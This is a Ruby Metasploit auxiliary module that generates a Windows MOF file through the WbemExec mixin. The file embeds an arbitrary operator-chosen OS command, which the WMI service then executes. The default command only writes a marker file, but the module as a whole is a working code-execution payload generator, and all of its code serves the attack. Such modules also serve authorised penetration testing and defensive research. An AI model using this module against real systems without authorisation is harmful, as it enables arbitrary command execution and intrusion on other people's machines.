require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Execute Commands Via Windows Management Instrumentation Service',
			'Description'    => %q{
					This module simply uses the WbemExec mixin to generate
				a mof file with an arbitrary command.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://www.metasploit.com' ],
				],
			'DisclosureDate' => 'Jun 29 2012'))

			register_options(
				[
					OptString.new('CMD', [ false, 'The OS command to execute', 'echo metasploit > %SYSTEMDRIVE%\\metasploit.txt']),
					OptString.new('FILENAME', [ false, 'Name of the mof file', 'msf.mof']),
				], self.class)
	end

	def run

		cmd = datastore['CMD']
		mof_name = datastore['FILENAME']
		mof = generate_mof(mof_name, cmd)

		print_status("Generating '#{mof_name}' with command '#{cmd}'")
		file_create(mof)

	end
end
